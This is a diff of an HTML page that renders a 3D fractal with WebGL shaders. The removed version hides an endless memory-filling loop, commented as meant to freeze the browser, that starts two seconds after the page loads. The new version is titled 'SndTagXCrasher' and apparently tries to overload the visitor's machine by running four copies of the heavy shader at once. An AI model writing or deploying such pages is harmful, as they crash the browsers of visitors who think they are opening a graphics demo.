@@ -2,187 +2,192 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Shader Madness Overload</title>
+    <title>SndTagXCrasher</title>
     <style>
-        body { margin: 0; overflow: hidden; }
-        #main { position: absolute; top: 0; left: 0; transform-origin: 0 0; }
+        body { 
+            margin: 0; 
+            overflow: hidden; 
+            display: grid; 
+            grid-template-columns: repeat(2, 1fr); 
+            grid-template-rows: repeat(2, 1fr); 
+            height: 100vh; 
+            width: 100vw; 
+        }
+        canvas { 
+            width: 100%; 
+            height: 100%; 
+            display: block; 
+        }
     </style>
 </head>
 <body>
-    <canvas id="c1" width="1024" height="1024"></canvas>
-    <div id="main"></div>
+    <canvas id="c1"></canvas>
+    <canvas id="c2"></canvas>
+    <canvas id="c3"></canvas>
+    <canvas id="c4"></canvas>
     <script>
-        var cx, cy;
-        var glposition, glright, glforward, glup, glorigin, glx, gly, gllen;
-        var canvas, gl;
-        var date = new Date();
-        var t1 = date.getTime();
-        var mx = 0, my = 0, mx1 = 0, my1 = 0, lasttimen = 0;
-        var ml = 0, mr = 0, mm = 0;
-        var len = 1.6;
-        var ang1 = 2.8;
-        var ang2 = 0.4;
-        var cenx = 0.0;
-        var ceny = 0.0;
-        var cenz = 0.0;
-        var KERNEL = "float kernal(vec3 ver){\n" +
-            "   vec3 a;\n" +
-            "   float b,c,d,e;\n" +
-            "   a=ver;\n" +
-            "   for(int i=0;i<5;i++){\n" +
-            "       b=length(a);\n" +
-            "       c=atan(a.y,a.x)*8.0;\n" +
-            "       e=1.0/b;\n" +
-            "       d=acos(a.z/b)*8.0;\n" +
-            "       b=pow(b,8.0);\n" +
-            "       a=vec3(b*sin(d)*cos(c),b*sin(d)*sin(c),b*cos(d))+ver;\n" +
-            "       if(b>6.0){\n" +
-            "           break;\n" +
-            "       }\n" +
-            "   }\n" +
-            "   return 4.0-a.x*a.x-a.y*a.y-a.z*a.z;\n" +
-            "}";
+        function initCanvas(canvasId) {
+            var cx, cy;
+            var glposition, glright, glforward, glup, glorigin, glx, gly, gllen;
+            var canvas = document.getElementById(canvasId);
+            var gl = canvas.getContext('webgl');
+            var date = new Date();
+            var t1 = date.getTime();
+            var mx = 0, my = 0, mx1 = 0, my1 = 0, lasttimen = 0;
+            var ml = 0, mr = 0, mm = 0;
+            var len = 1.6;
+            var ang1 = 2.8;
+            var ang2 = 0.4;
+            var cenx = 0.0;
+            var ceny = 0.0;
+            var cenz = 0.0;
+            var KERNEL = "float kernal(vec3 ver){\n" +
+                "   vec3 a;\n" +
+                "   float b,c,d,e;\n" +
+                "   a=ver;\n" +
+                "   for(int i=0;i<5;i++){\n" +
+                "       b=length(a);\n" +
+                "       c=atan(a.y,a.x)*8.0;\n" +
+                "       e=1.0/b;\n" +
+                "       d=acos(a.z/b)*8.0;\n" +
+                "       b=pow(b,8.0);\n" +
+                "       a=vec3(b*sin(d)*cos(c),b*sin(d)*sin(c),b*cos(d))+ver;\n" +
+                "       if(b>6.0){\n" +
+                "           break;\n" +
+                "       }\n" +
+                "   }\n" +
+                "   return 4.0-a.x*a.x-a.y*a.y-a.z*a.z;\n" +
+                "}";
 
-        function ontimer() {
-            ang1 += 0.01;
-            draw();
-            window.requestAnimationFrame(ontimer);
-        }
-
-        function draw() {
-            date = new Date();
-            var t2 = date.getTime();
-            t1 = t2;
-            gl.uniform1f(glx, cx * 2.0 / (cx + cy));
-            gl.uniform1f(gly, cy * 2.0 / (cx + cy));
-            gl.uniform1f(gllen, len);
-            gl.uniform3f(glorigin, len * Math.cos(ang1) * Math.cos(ang2) + cenx, len * Math.sin(ang2) + ceny, len * Math.sin(ang1) * Math.cos(ang2) + cenz);
-            gl.uniform3f(glright, Math.sin(ang1), 0, -Math.cos(ang1));
-            gl.uniform3f(glup, -Math.sin(ang2) * Math.cos(ang1), Math.cos(ang2), -Math.sin(ang2) * Math.sin(ang1));
-            gl.uniform3f(glforward, -Math.cos(ang1) * Math.cos(ang2), -Math.sin(ang2), -Math.sin(ang1) * Math.cos(ang2));
-            gl.drawArrays(gl.TRIANGLES, 0, 6);
-            gl.finish();
-        }
-
-        document.addEventListener("mousedown", function(ev) {
-            var oEvent = ev || event;
-            if (oEvent.button == 0) { ml = 1; mm = 0; }
-            if (oEvent.button == 2) { mr = 1; mm = 0; }
-            mx = oEvent.clientX;
-            my = oEvent.clientY;
-        }, false);
-
-        document.addEventListener("mouseup", function(ev) {
-            var oEvent = ev || event;
-            if (oEvent.button == 0) { ml = 0; }
-            if (oEvent.button == 2) { mr = 0; }
-        }, false);
-
-        document.addEventListener("mousemove", function(ev) {
-            var oEvent = ev || event;
-            if (ml == 1) {
-                ang1 += (oEvent.clientX - mx) * 0.002;
-                ang2 += (oEvent.clientY - my) * 0.002;
-                if (oEvent.clientX != mx || oEvent.clientY != my) { mm = 1; }
+            function ontimer() {
+                ang1 += 0.01;
+                draw();
+                window.requestAnimationFrame(ontimer);
             }
-            if (mr == 1) {
-                var l = len * 4.0 / (cx + cy);
-                cenx += l * (-(oEvent.clientX - mx) * Math.sin(ang1) - (oEvent.clientY - my) * Math.sin(ang2) * Math.cos(ang1));
-                ceny += l * ((oEvent.clientY - my) * Math.cos(ang2));
-                cenz += l * ((oEvent.clientX - mx) * Math.cos(ang1) - (oEvent.clientY - my) * Math.sin(ang2) * Math.sin(ang1));
-                if (oEvent.clientX != mx || oEvent.clientY != my) { mm = 1; }
+
+            function draw() {
+                date = new Date();
+                var t2 = date.getTime();
+                t1 = t2;
+                gl.uniform1f(glx, cx * 2.0 / (cx + cy));
+                gl.uniform1f(gly, cy * 2.0 / (cx + cy));
+                gl.uniform1f(gllen, len);
+                gl.uniform3f(glorigin, len * Math.cos(ang1) * Math.cos(ang2) + cenx, len * Math.sin(ang2) + ceny, len * Math.sin(ang1) * Math.cos(ang2) + cenz);
+                gl.uniform3f(glright, Math.sin(ang1), 0, -Math.cos(ang1));
+                gl.uniform3f(glup, -Math.sin(ang2) * Math.cos(ang1), Math.cos(ang2), -Math.sin(ang2) * Math.sin(ang1));
+                gl.uniform3f(glforward, -Math.cos(ang1) * Math.cos(ang2), -Math.sin(ang2), -Math.sin(ang1) * Math.cos(ang2));
+                gl.drawArrays(gl.TRIANGLES, 0, 6);
+                gl.finish();
             }
-            mx = oEvent.clientX;
-            my = oEvent.clientY;
-        }, false);
 
-        document.addEventListener("mousewheel", function(ev) {
-            ev.preventDefault();
-            var oEvent = ev || event;
-            len *= Math.exp(-0.001 * oEvent.wheelDelta);
-        }, false);
-
-        document.addEventListener("touchstart", function(ev) {
-            var n = ev.touches.length;
-            if (n == 1) {
-                var oEvent = ev.touches[0];
+            document.addEventListener("mousedown", function(ev) {
+                var oEvent = ev || event;
+                if (oEvent.button == 0) { ml = 1; mm = 0; }
+                if (oEvent.button == 2) { mr = 1; mm = 0; }
                 mx = oEvent.clientX;
                 my = oEvent.clientY;
-            } else if (n == 2) {
-                var oEvent = ev.touches[0];
+            }, false);
+
+            document.addEventListener("mouseup", function(ev) {
+                var oEvent = ev || event;
+                if (oEvent.button == 0) { ml = 0; }
+                if (oEvent.button == 2) { mr = 0; }
+            }, false);
+
+            document.addEventListener("mousemove", function(ev) {
+                var oEvent = ev || event;
+                if (ml == 1) {
+                    ang1 += (oEvent.clientX - mx) * 0.002;
+                    ang2 += (oEvent.clientY - my) * 0.002;
+                    if (oEvent.clientX != mx || oEvent.clientY != my) { mm = 1; }
+                }
+                if (mr == 1) {
+                    var l = len * 4.0 / (cx + cy);
+                    cenx += l * (-(oEvent.clientX - mx) * Math.sin(ang1) - (oEvent.clientY - my) * Math.sin(ang2) * Math.cos(ang1));
+                    ceny += l * ((oEvent.clientY - my) * Math.cos(ang2));
+                    cenz += l * ((oEvent.clientX - mx) * Math.cos(ang1) - (oEvent.clientY - my) * Math.sin(ang2) * Math.sin(ang1));
+                    if (oEvent.clientX != mx || oEvent.clientY != my) { mm = 1; }
+                }
                 mx = oEvent.clientX;
                 my = oEvent.clientY;
-                oEvent = ev.touches[1];
-                mx1 = oEvent.clientX;
-                my1 = oEvent.clientY;
-            }
-            lasttimen = n;
-        }, false);
+            }, false);
 
-        document.addEventListener("touchend", function(ev) {
-            var n = ev.touches.length;
-            if (n == 1) {
-                var oEvent = ev.touches[0];
-                mx = oEvent.clientX;
-                my = oEvent.clientY;
-            } else if (n == 2) {
-                var oEvent = ev.touches[0];
-                mx = oEvent.clientX;
-                my = oEvent.clientY;
-                oEvent = ev.touches[1];
-                mx1 = oEvent.clientX;
-                my1 = oEvent.clientY;
-            }
-            lasttimen = n;
-        }, false);
+            document.addEventListener("mousewheel", function(ev) {
+                ev.preventDefault();
+                var oEvent = ev || event;
+                len *= Math.exp(-0.001 * oEvent.wheelDelta);
+            }, false);
 
-        document.addEventListener("touchmove", function(ev) {
-            ev.preventDefault();
-            var n = ev.touches.length;
-            if (n == 1 && lasttimen == 1) {
-                var oEvent = ev.touches[0];
-                ang1 += (oEvent.clientX - mx) * 0.002;
-                ang2 += (oEvent.clientY - my) * 0.002;
-                mx = oEvent.clientX;
-                my = oEvent.clientY;
-            } else if (n == 2) {
-                var oEvent = ev.touches[0];
-                var oEvent1 = ev.touches[1];
-                var l = len * 2.0 / (cx + cy), l1;
-                cenx += l * (-(oEvent.clientX + oEvent1.clientX - mx - mx1) * Math.sin(ang1) - (oEvent.clientY + oEvent1.clientY - my - my1) * Math.sin(ang2) * Math.cos(ang1));
-                ceny += l * ((oEvent.clientY + oEvent1.clientY - my - my1) * Math.cos(ang2));
-                cenz += l * ((oEvent.clientX + oEvent1.clientX - mx - mx1) * Math.cos(ang1) - (oEvent.clientY + oEvent1.clientY - my - my1) * Math.sin(ang2) * Math.sin(ang1));
-                l1 = Math.sqrt((mx - mx1) * (mx - mx1) + (my - my1) * (my - my1) + 1.0);
-                mx = oEvent.clientX;
-                my = oEvent.clientY;
-                mx1 = oEvent1.clientX;
-                my1 = oEvent1.clientY;
-                l = Math.sqrt((mx - mx1) * (mx - mx1) + (my - my1) * (my - my1) + 1.0);
-                len *= l1 / l;
-            }
-            lasttimen = n;
-        }, false);
+            document.addEventListener("touchstart", function(ev) {
+                var n = ev.touches.length;
+                if (n == 1) {
+                    var oEvent = ev.touches[0];
+                    mx = oEvent.clientX;
+                    my = oEvent.clientY;
+                } else if (n == 2) {
+                    var oEvent = ev.touches[0];
+                    mx = oEvent.clientX;
+                    my = oEvent.clientY;
+                    oEvent = ev.touches[1];
+                    mx1 = oEvent.clientX;
+                    my1 = oEvent.clientY;
+                }
+                lasttimen = n;
+            }, false);
 
-        document.oncontextmenu = function(event) {
-            if (mm == 1) { event.preventDefault(); }
-        };
+            document.addEventListener("touchend", function(ev) {
+                var n = ev.touches.length;
+                if (n == 1) {
+                    var oEvent = ev.touches[0];
+                    mx = oEvent.clientX;
+                    my = oEvent.clientY;
+                } else if (n == 2) {
+                    var oEvent = ev.touches[0];
+                    mx = oEvent.clientX;
+                    my = oEvent.clientY;
+                    oEvent = ev.touches[1];
+                    mx1 = oEvent.clientX;
+                    my1 = oEvent.clientY;
+                }
+                lasttimen = n;
+            }, false);
 
-        window.onresize = function() {
-            cx = document.body.clientWidth;
-            cy = document.body.clientHeight;
-            if (cx > cy) { cx = cy; } else { cy = cx; }
-            document.getElementById("main").style.width = "1024px";
-            document.getElementById("main").style.height = "1024px";
-            document.getElementById("main").style.transform = "scale(" + (cx / 1024) + "," + (cy / 1024) + ")";
-        };
+            document.addEventListener("touchmove", function(ev) {
+                ev.preventDefault();
+                var n = ev.touches.length;
+                if (n == 1 && lasttimen == 1) {
+                    var oEvent = ev.touches[0];
+                    ang1 += (oEvent.clientX - mx) * 0.002;
+                    ang2 += (oEvent.clientY - my) * 0.002;
+                    mx = oEvent.clientX;
+                    my = oEvent.clientY;
+                } else if (n == 2) {
+                    var oEvent = ev.touches[0];
+                    var oEvent1 = ev.touches[1];
+                    var l = len * 2.0 / (cx + cy), l1;
+                    cenx += l * (-(oEvent.clientX + oEvent1.clientX - mx - mx1) * Math.sin(ang1) - (oEvent.clientY + oEvent1.clientY - my - my1) * Math.sin(ang2) * Math.cos(ang1));
+                    ceny += l * ((oEvent.clientY + oEvent1.clientY - my - my1) * Math.cos(ang2));
+                    cenz += l * ((oEvent.clientX + oEvent1.clientX - mx - mx1) * Math.cos(ang1) - (oEvent.clientY + oEvent1.clientY - my - my1) * Math.sin(ang2) * Math.sin(ang1));
+                    l1 = Math.sqrt((mx - mx1) * (mx - mx1) + (my - my1) * (my - my1) + 1.0);
+                    mx = oEvent.clientX;
+                    my = oEvent.clientY;
+                    mx1 = oEvent1.clientX;
+                    my1 = oEvent1.clientY;
+                    l = Math.sqrt((mx - mx1) * (mx - mx1) + (my - my1) * (my - my1) + 1.0);
+                    len *= l1 / l;
+                }
+                lasttimen = n;
+            }, false);
 
-        window.onload = function() {
-            cx = document.body.clientWidth;
-            cy = document.body.clientHeight;
-            if (cx > cy) { cx = cy; } else { cy = cx; }
-            document.getElementById("main").style.width = "1024px";
-            document.getElementById("main").style.height = "1024px";
-            document.getElementById("main").style.transform = "scale(" + (cx / 1024) + "," + (cy / 1024) + ")";
+            document.oncontextmenu = function(event) {
+                if (mm == 1) { event.preventDefault(); }
+            };
+
+            cx = window.innerWidth / 2;
+            cy = window.innerHeight / 2;
+            canvas.width = cx;
+            canvas.height = cy;
+
             var positions = [-1.0, -1.0, 0.0, 1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, 1.0, 0.0];
             var VSHADER_SOURCE =
                 "#version 100 \n" +
@@ -345,8 +350,6 @@
                 "   gl_FragColor = vec4(color.x, color.y, color.z, 1.0);\n" +
                 "}";
 
-            canvas = document.getElementById('c1');
-            gl = canvas.getContext('webgl');
             var vertshader = gl.createShader(gl.VERTEX_SHADER);
             var fragshader = gl.createShader(gl.FRAGMENT_SHADER);
             var shaderProgram = gl.createProgram();
@@ -375,17 +378,18 @@
             gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
             gl.vertexAttribPointer(glposition, 3, gl.FLOAT, false, 0, 0);
             gl.enableVertexAttribArray(glposition);
-            gl.viewport(0, 0, 1024, 1024);
+            gl.viewport(0, 0, cx, cy);
             draw();
             window.requestAnimationFrame(ontimer);
+        }
 
-            // Memory overload to freeze the browser
-            setTimeout(function() {
-                let crashArray = [];
-                while (true) {
-                    crashArray.push(new Array(1000000).join('x'));
-                }
-            }, 2000); // 2-second delay to let the page load first
+        window.onresize = function() {
+            var canvases = ['c1', 'c2', 'c3', 'c4'];
+            canvases.forEach(function(id) {
+                var canvas = document.getElementById(id);
+                canvas.width = window.innerWidth / 2;
+                canvas.height = window.innerHeight / 2;
+            });
         };
     </script>
 </body>
